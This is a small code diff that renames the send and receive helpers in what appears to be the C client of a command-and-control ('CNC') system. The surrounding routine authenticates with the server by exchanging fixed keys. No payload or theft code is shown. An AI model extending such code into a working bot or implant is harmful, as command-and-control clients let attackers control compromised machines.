@@ -54,11 +54,11 @@ void auth_with_cnc()
     char received_auth_key[AUTH_KEY_LEN];
 
     log_info("Authenticating with CNC.");
-    byte_count = send_to_cnc(AUTH_KEY_TO_CNC, AUTH_KEY_LEN);
+    byte_count = send_cnc(AUTH_KEY_TO_CNC, AUTH_KEY_LEN);
     if (byte_count != AUTH_KEY_LEN)
         fatal_error("Failed to send authentication key to CNC.");
 
-    byte_count = recv_from_cnc(received_auth_key, AUTH_KEY_LEN);
+    byte_count = recv_cnc(received_auth_key, AUTH_KEY_LEN);
     if (byte_count != AUTH_KEY_LEN || memcmp(received_auth_key, AUTH_KEY_FROM_CNC, AUTH_KEY_LEN))
         fatal_error("Received invalid authentication key from CNC.");
 }
@@ -99,7 +99,7 @@ void reconnect_to_cnc()
     connect_to_cnc(cnc_addrinfo);
 }
 
-int send_to_cnc(void *buf, size_t len)
+int send_cnc(void *buf, size_t len)
 {
     int bytes_sent;
 
@@ -114,7 +114,7 @@ int send_to_cnc(void *buf, size_t len)
     return bytes_sent;
 }
 
-int recv_from_cnc(void *buf, size_t len)
+int recv_cnc(void *buf, size_t len)
 {
     int bytes_read;
 
